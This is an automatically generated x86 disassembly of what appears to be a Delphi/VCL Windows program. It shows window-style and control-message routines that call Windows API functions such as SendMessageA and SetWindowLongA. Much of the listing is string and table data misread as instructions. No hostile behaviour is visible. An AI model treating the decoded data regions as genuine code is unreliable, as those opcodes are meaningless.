add [ eax ] ah
add [ eax + eax + 0x7 ] eax
push cs
push esp
dec ebp
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
dec eax
inc [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xff
insb
jae r-xdata
imul ebp [ fs : esi + 0x61 ] 0x4d0d016c
outsd
arpl [ ecx + 0x6c ] sp
inc esp
popa
jne r-xdata
outsb
jae r-xdata
jb r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
insb
add [ eax ] eax
jmp [ eax + 0x10045c4 ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x75410800
je r-xdata
add [ eax ] al
inc ebx
popad
insb
outsb
popad
jb r-xdata
ja r-xdata
std
inc ebx
add [ eax ] cl
adc al 0x54
dec edi
outsb
jpe r-xdata
mov ah 0x8
inc ebp
add [ eax + eax ] dh
jmp [ eax ]
pop ebx
add [ eax ] al
jmp [ eax + 0x4f ]
add [ eax + eax + 0x44 ] al
inc [ ebx ]
cmp al [ eax ]
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
les eax [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push cs
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
jae r-xdata
jae r-xdata
add [ eax + 0x430b0011 ] al
outsd
jb r-xdata
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add al bl
add [ ebp ] al
add bh bh
mov eax 0x800448b
mov al [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x45070018 ] al
outsb
inc esp
popad
je r-xdata
jb r-xdata
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
jb r-xdata
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or eax [ ebx + 0x6f ]
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
jo r-xdata
dec ebp
outsd
je r-xdata
sbb ch bh
inc ebx
add [ eax ] ah
add al [ eax ]
inc [ eax - 0x74 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
inc esi
imul esi [ edx + 0x73 ] 0x79614474
dec edi
push di
imul edi [ gs : eax ] 0x2e
inc edx
add [ eax ] ch
add bh bh
inc eax
add [ edi ] dl
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov eax 0x18004507
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebx
pop es
inc ebp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx + eax ] al
dec [ edi + ecx * 4 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or ecx [ ebp + 0x75 ]
insb
je r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xfc65646f
sti
inc ebx
add [ eax ] cl
add al [ eax ]
sbb al 0x0
pop es
dec ecx
insd
dec esi
popad
insd
mov eax 0x28004507
add al [ eax ]
[ eax + 0x1000448c ]
inc ebp
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4907001c ] al
pop ebx
inc ebp
add [ eax + 0x5b ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001a ] al
outsd
outsb
je r-xdata
push 0x40ff0000
adc eax 0x1840045
add bh bh
test [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
sbb eax [ eax ]
pop es
dec ecx
insd
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
dec ebx
push ebx
insb
arpl [ gs : eax + edi * 4 + 0x7 ] si
inc ebp
add [ eax - 0x76 ] cl
inc esp
add [ eax - 0x76 ] bh
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44040013 ] al
popad
je r-xdata
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
rol [ eax ] 0x45
add [ edx ] bh
add bh bh
sub_4405a7
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al [ eax ]
or edx [ edi + 0x65 ]
imul ecx [ gs : esi + 0x75 ] 0x6d
bound esp [ ebp + 0x72 ]
jae r-xdata
add [ edx ] ch
add [ ebx ] cl
push edi
imul ecx [ gs : esi + 0x75 ] 0x6d
pop edi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
sub_4407ec
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x28004408
add [ eax ] al
add [ edx ] cl
inc ebx
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x69 ] ch
inc ecx
add [ esp + edx * 4 - 0x6b3bffbf ] bh
inc ecx
add ah ch
xchg esp eax
inc esp
add ah dh
scasd [ edi ]
inc ebx
add [ eax + ebx * 4 - 0x6a0fffbf ] dh
inc esp
add [ eax - 0x47ffbb6b ] ah
scasd [ edi ]
inc ebx
add [ eax ] bh
xchg ebp eax
inc esp
add [ ebp + edx * 4 + 0x44 ] ch
add al al
xchg ebp eax
inc esp
add [ esi + edx * 4 ] cl
inc esp
add [ eax ] ch
xchg esi eax
inc esp
add [ esp + edx * 2 ] cl
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x8 ] ch
inc esp
add [ eax ] ch
outsb
outsb
je r-xdata
je r-xdata
insb
arpl [ gs : ebp + 0x64 ] si
dec ecx
sub [ esi ] al
and [ eax ] al
add bh bh
sub al 0x0
add dh bh
add [ eax ] eax
add [ eax ] al
add [ ecx ] dl
dec edi
jbe r-xdata
insd
lea eax [ eax ]
jl r-xdata
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add al [ eax ]
push es
dec ecx
inc eax
add [ eax + 0x9 ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx + 0x44 ] ch
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x67 ] ah
inc ecx
add [ esp + edx * 4 - 0x6b3bffbf ] bh
inc ecx
add ah cl
cdq
inc ecx
add [ eax ] bh
sahf
inc ecx
add [ esi + ebx * 4 ] bh
inc ecx
add [ edi + edx * 4 ] al
inc esp
add ah dh
popfd
inc ecx
add al bh
popfd
inc ecx
add [ edx + ebx * 4 + 0x41 ] ah
add al ah
0xb0c00041 0x43
js r-xdata
inc eax
xor al 0x40
popad
jns r-xdata
add ah ah
mov [ 0x34340043 ] eax
inc eax
add [ eax + 0x34 ] al
inc eax
jb r-xdata
bound ebp [ edi + 0x45 ]
js r-xdata
inc esp
add [ edi ] al
or al 0x54
inc ebx
outsd
insd
add [ eax ] al
or [ eax + eax ] eax
add [ eax ] al
add [ eax ] al
inc esp
add [ 0x6d6f4354 ] cl
bound ebp [ edi + 0x45 ]
js r-xdata
lodsb [ esi ]
insd
popad
dec ecx
outsb
js r-xdata
add [ eax ] al
add [ eax - 0x1 ] al
add eax [ eax ]
adc [ edi + 0x76 ] ecx
jb r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ edx + ecx + 0x180044 ] ah
add [ eax ] al
and al al
inc esp
add [ esp + esi ] dh
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x28004409 ] bl
sub [ esi ] al
sbb al 0x0
add bh bh
xor [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add al 0x0
adc dl [ ebx + 0x65 ]
inc esi
add [ eax + eax ] bl
insd
xor al 0x8
inc esp
add [ eax + 0x50043a2 ] ch
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
inc esp
or al 0x44
js r-xdata
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x5b ] cl
inc esp
add [ esp + edx * 4 - 0x5f1bffbf ] bh
inc ecx
add ah bl
lahf
xor al 0x40
insd
jae r-xdata
insd
popad
dec ecx
outsb
js r-xdata
dec ecx
insb
jae r-xdata
rcl [ ebp + eax * 2 + 0x449e0400 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ eax - 0x23 ] ah
inc esp
add [ eax - 0x5e ] bl
inc esp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax - 0x18 ] bl
inc esp
add [ eax ] dl
fiadd [ eax + eax + 0x3c ]
fiadd [ eax + eax + 0x6c ]
call 0xffffffffdd780c52
inc esp
add [ edi - 0x185fffbc ] dl
inc esp
add [ eax + ebp * 8 ] ch
inc esp
add [ ebx + edx ] ah
inc esi
add [ ebp + ebx * 8 - 0x194bffbc ] al
inc esp
add [ eax ] bh
loopne r-xdata
add [ edi * 2 + 0x581c0045 ] al
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ esp + ebx * 4 + 0x44 ] ch
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edx - 0x5fffbbf4 ] al
push esi
or al 0x44
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
or [ eax + eax + 0x28 ] eax
shr [ ecx + ecx + 0xd070044 ] 0x54
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
inc eax
add [ eax + eax ] ah
add bh bh
add [ eax + edx + 0x40 ] dl
pushfd
inc esp
add ah ah
0xa1480044 0x44
insb
popfd
inc esp
add [ eax + 0x110044a2 ] ch
push esp
inc ebx
jne r-xdata
add [ eax - 0x5f ] al
inc esp
add [ eax - 0x5e ] dl
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ edx + ebx * 4 + 0x44 ] ch
add [ esi + ecx * 8 + 0x45 ] dl
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
imul ebp [ esi + 0x67 ] 0xabc9073
inc esp
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x6f ]
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
inc eax
xor al 0x40
je r-xdata
inc eax
je r-xdata
add al [ eax ]
add [ eax ] bh
rol [ eax + eax + 0x5c ] 0x1a
inc edx
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
js r-xdata
inc ecx
add al dl
cmpsb [ esi ] [ edi ]
inc ecx
add ah ah
mov al [ 0xffffffff9fdc0041 ]
insd
jae r-xdata
call InitCommonControls
js r-xdata
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x1b ] cl
inc edx
add [ eax - 0x80 ] al
inc ebp
add [ ebx + ebx + 0x42 ] bh
dec eax
xor al 0x40
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
xor al 0x40
add al al
adc eax [ edx ]
dec eax
je r-xdata
inc esp
add ah dh
cmpsb [ esi ] [ edi ]
inc esp
add [ eax ] al
cmpsd [ esi ] [ edi ]
inc esp
add [ edi ] cl
inc esp
add al cl
mov [ 0xffffffffa7ac0041 ] eax
fcomp [ edi - 0x592fffbf ]
or [ eax + eax + 0x70 ] eax
movsb [ edi ] [ esi ]
inc ebx
add [ ebx ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
jne r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xffffc08b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
inc ecx
add ah dl
in eax 0x44
add [ esp + ebx * 4 - 0x7cc3ffbc ] dh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
imul ebp [ esi + 0x67 ] 0x440a1c73
add [ ecx + eax * 8 ] al
inc esp
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
inc esp
add al al
cmpsd [ esi ] [ edi ]
inc esp
add [ edx + ebp * 4 - 0x54ebffbf ] cl
inc ecx
add ah dl
cmpsd [ esi ] [ edi ]
inc esp
add [ eax ] cl
lodsd [ esi ]
inc ecx
add [ eax ] dh
movsb [ edi ] [ esi ]
inc esp
add [ esp + 0x44 ] dl
add [ edi + ebx * 4 ] ah
inc ecx
add [ esp - 0x5a87ffbc ] al
inc esp
add [ ebp - 0x5c8bffbc ] al
inc ecx
add [ edi ] ah
inc esp
add [ eax - 0x59 ] dh
inc esp
add ah bl
cmpsb [ esi ] [ edi ]
inc ecx
add [ eax - 0x59 ] bh
inc esp
add [ eax ] dl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x59 ] al
inc ecx
add [ edi - 0x5873ffbf ] dl
inc esp
add al bl
test eax 0xaa300041
inc ecx
add ah al
stosb [ edi ]
inc ecx
add [ eax + ebp * 4 ] dl
inc esp
add [ eax + ebp * 4 ] bl
inc esp
add [ edx ] dl
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
insb
jae r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
inc esp
add [ eax - 0x22 ] bh
inc esp
add [ ecx ] dh
inc esp
add [ edx ] dl
inc esp
add [ eax - 0x19 ] dh
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] bl
add al [ ebx ]
push 0x7000002
add bh ch
dec [ 0x4eb009b0 ]
mov esp 0x201ffd9
mov ch 0xff
mov al 0xa1
inc esp
add [ ebx * 4 - 0x631bffbc ] cl
mov eax [ 0xffffffffa2500044 ]
or al 0x44
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ ecx + ebx * 4 + 0x44 ] al
add [ eax - 0x37 ] ch
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
insb
jae r-xdata
inc eax
add [ eax + 0x34 ] al
inc eax
add [ edx + ecx ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
or al [ eax + eax + 0x18 ]
add [ eax ] al
add [ eax ] ah
rol [ eax + eax + 0x34 ] 0x34
add [ eax - 0x57ffbab7 ] dh
mov ebx 0x4a5c0043
inc ebp
add [ eax ] al
sbb eax [ edx ]
xchg esp eax
sbb eax [ edx ]
call 0xffffffff9c444f48
dec eax
inc ebp
add al ah
push ds
inc esi
add [ eax ] dl
dec ecx
inc ebp
add [ eax ] cl
pop ds
inc esi
add [ eax + eax * 4 + 0x45 ] ah
add [ eax + 0x4400454a ] cl
dec ecx
inc ebp
add [ eax + 0x1f ] bl
inc esi
add [ edi + ebx + 0x46 ] ch
add [ ecx + ecx * 2 + 0x45 ] bh
add [ edi + ebx + 0x49d80046 ] dl
inc ebp
add [ edi + ebx + 0x49f80046 ] bl
inc ebp
add [ edi + ebx - 0x7f93ffba ] ah
inc ebp
add ah ch
dec edx
inc ebp
add [ ebx + ecx * 2 ] ch
inc ebp
add [ eax ] bl
dec edx
inc ebp
add [ eax - 0x43ffb9e1 ] bh
pop ds
inc esi
add [ edx + ecx * 2 ] bh
inc ebp
add [ edi + eax * 2 - 0x4497ffbb ] ch
inc ebx
add ah ch
mov ebx 0xbb7c0043
inc ebx
add [ eax - 0x44 ] bl
inc ebx
add al ah
mov ebp 0xa9780043
inc esp
add [ eax ] cl
test eax 0x54150044
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
outsd
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax + 0x440c ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0xc ] dl
inc esp
add [ ebp + 0xb340040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx + 0x44 ] al
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
js r-xdata
movsb [ edi ] [ esi ]
or eax 0x280044
add [ eax ] al
sub al 0xae
inc ebx
add [ esp + esi ] dh
inc eax
or eax [ eax + eax - 0xc ]
retn 0x44
sub_440bb8
xor al 0xbd
inc ebp
add [ edx + eax * 8 + 0x45 ] dl
add [ ebx + eax * 4 - 0x75b7ffbb ] dh
inc ebp
add al ch
xchg edi eax
inc ebp
add [ ebx + ebx * 4 ] dh
inc esp
add al dl
xchg esp eax
inc ebp
add [ esi + ebx * 4 ] al
inc esp
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ eax - 0x23 ] ah
inc esp
add [ eax - 0x5e ] bl
inc esp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax - 0x18 ] bl
inc esp
add [ eax ] dl
fiadd [ eax + eax + 0x3c ]
fiadd [ eax + eax + 0x6c ]
call 0xffffffffdd780c52
inc esp
add [ edi - 0x185fffbc ] dl
inc esp
add [ eax + ebp * 8 ] ch
inc esp
add [ ebx + edx ] ah
inc esi
add [ ebp + ebx * 8 - 0x194bffbc ] al
inc esp
add [ eax ] bh
loopne r-xdata
pushfd
inc esp
add ah ah
0xa1480044 0x44
insb
popfd
inc esp
add [ eax + 0x110044a2 ] ch
push esp
inc ebx
jne r-xdata
add [ eax - 0x5f ] al
inc esp
add [ eax - 0x5e ] dl
inc eax
je r-xdata
call InitCommonControls
js r-xdata
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x1b ] cl
inc edx
add [ eax - 0x80 ] al
inc ebp
add [ ebx + ebx + 0x42 ] bh
dec eax
xor al 0x40
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
jne r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xffffc08b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
inc esp
add [ eax - 0x22 ] bh
inc esp
add [ ecx ] dh
inc esp
add [ edx ] dl
inc esp
add [ eax - 0x19 ] dh
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] bl
add al [ ebx ]
push 0x7000002
add bh ch
dec [ 0x4eb009b0 ]
mov esp 0x201ffd9
mov ch 0xff
mov al 0xa1
inc esp
add [ ebx * 4 - 0x631bffbc ] cl
mov eax [ 0xffffffffa2500044 ]
or al 0x44
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax - 0x57ffbab7 ] dh
mov ebx 0x4a5c0043
inc ebp
add [ eax ] al
sbb eax [ edx ]
xchg esp eax
sbb eax [ edx ]
call 0xffffffff9c444f48
dec eax
inc ebp
add al ah
push ds
inc esi
add [ eax ] dl
dec ecx
inc ebp
add [ eax ] cl
pop ds
inc esi
add [ eax + eax * 4 + 0x45 ] ah
add [ eax + 0x4400454a ] cl
dec ecx
inc ebp
add [ eax + 0x1f ] bl
inc esi
add [ edi + ebx + 0x46 ] ch
add [ ecx + ecx * 2 + 0x45 ] bh
add [ edi + ebx + 0x49d80046 ] dl
inc ebp
add [ edi + ebx + 0x49f80046 ] bl
inc ebp
add [ edi + ebx - 0x7f93ffba ] ah
inc ebp
add ah ch
dec edx
inc ebp
add [ ebx + ecx * 2 ] ch
inc ebp
add [ eax ] bl
dec edx
inc ebp
add [ eax - 0x43ffb9e1 ] bh
pop ds
inc esi
add [ edx + ecx * 2 ] bh
inc ebp
add [ edi + eax * 2 - 0x4497ffbb ] ch
inc ebx
add ah ch
mov ebx 0xbb7c0043
inc ebx
add [ eax - 0x44 ] bl
inc ebx
add al ah
mov ebp 0xa9780043
inc esp
add [ eax ] cl
test eax 0x54150044
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
outsd
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
js r-xdata
movsb [ edi ] [ esi ]
or eax 0x280044
add [ eax ] al
sub al 0xae
inc ebx
add [ esp + esi ] dh
inc eax
or eax [ eax + eax - 0xc ]
retn 0x44
sub_440dd4
push ebx
add esp 0xfffffff8
mov [ esp ] 0x8
mov [ esp + 0x4 ] eax
mov eax esp
call sub_42c5c8
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
jne r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
call InitCommonControls
sub_440e00
push ebx
mov ebx eax
mov eax ebx
call sub_440dd4
test al al
jne r-xdata
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
sub_440e60
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov ebp eax
mov eax ebp
call sub_45c684
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
push 0xfffffff0
mov eax ebp
call sub_45c380
push eax
call GetWindowLongA
mov esi eax
test bl bl
jne r-xdata
or esi edi
not edi
and esi edi
jmp r-xdata
push esi
push 0xfffffff0
mov eax ebp
call sub_45c380
push eax
call SetWindowLongA
sub_440ea8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x10 ] 0x32
mov [ esi + 0x15 ] 0x1
mov [ esi + 0x17 ] 0x1
xor edx edx
mov eax esi
call sub_419730
mov eax esi
call sub_440f7c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_440ef4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4193d8
mov edi esi
mov edx [ edi + 0xc ]
mov eax ebx
call sub_441038
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_441060
mov dl [ edi + 0x14 ]
mov eax ebx
call sub_441008
mov dl [ edi + 0x15 ]
mov eax ebx
call sub_441018
mov dl [ edi + 0x18 ]
mov eax ebx
call sub_441028
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_440f7c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x17 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_4033e8
test eax eax
je r-xdata
mov eax ebx
mov si 0xffff
call sub_4033e8
mov eax [ eax + 0x18 ]
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_440f50
mov [ ebx + 0x17 ] 0x1
sub_440fe4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0xc ]
call sub_403fd0
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4197d4
sub_441038
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx esi
call sub_404388
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0xc ]
mov edx esi
call sub_403fd0
xor edx edx
mov eax ebx
call sub_419798
sub_441070
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403550
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_419914
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
mov ecx eax
xor edx edx
mov eax edi
call sub_419914
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
sub_4410f4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebx + 0x18 ]
call sub_4418c4
pop esi
pop ebx
retn
mov eax esi
call sub_4197bc
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x18 ]
call sub_44173c
pop esi
pop ebx
retn
sub_441124
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_458074
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0xff00000f
mov eax ebx
call sub_455bec
mov edx 0x13
mov eax ebx
call sub_45522c
mov dl 0x2
mov eax ebx
call sub_454f60
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x208 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4250c4
mov esi eax
mov [ ebx + 0x20c ] esi
mov eax esi
mov edx ebx
call sub_454628
mov [ ebx + 0x215 ] 0x1
xor edx edx
mov eax ebx
call sub_455b78
mov [ ebx + 0x217 ] 0x1
mov eax ebx
call sub_44170c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4411dc
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x20c ]
call sub_4031ec
mov eax [ esi + 0x208 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_458198
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_441218
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x4
call sub_440dd4
mov edx esi
mov eax ebx
call sub_4591d4
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_459100
cmp [ ebx + 0x215 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0x216 ] 0x0
jne r-xdata
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
call sub_44ae1c
call sub_44aefc
test al al
je r-xdata
mov al 0x1
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
mov eax [ esi + 0x24 ]
or eax 0x2
or eax 0x1
mov [ esi + 0x24 ] eax
pop esi
pop ebx
retn
sub_44129b
add [ ebx - 0x75 ] dl
fdiv [ ebx ]
ror [ ebx + 0xa3ce8c3 ] cl
add [ eax ] al
mov eax ebx
call sub_459300
mov eax [ ebx + 0x70 ]
call sub_4242e8
push eax
push 0x0
push 0x2001
mov eax ebx
call sub_45c380
push eax
call SendMessageA
xor ecx ecx
mov dl 0x1
mov eax ebx
call sub_4418c4
cmp [ ebx + 0x210 ] 0x0
je r-xdata
cmp [ ebx + 0x214 ] 0x0
je r-xdata
mov eax [ ebx + 0x210 ]
call sub_40443c
push eax
push 0xff
push 0x401
mov eax ebx
call sub_45c380
push eax
call SendMessageA
pop ebx
retn
push 0x0
push 0x1
push 0x409
mov eax ebx
call sub_45c380
push eax
call SendMessageA
sub_441324
push ebx
cmp [ eax + 0x22a ] 0x0
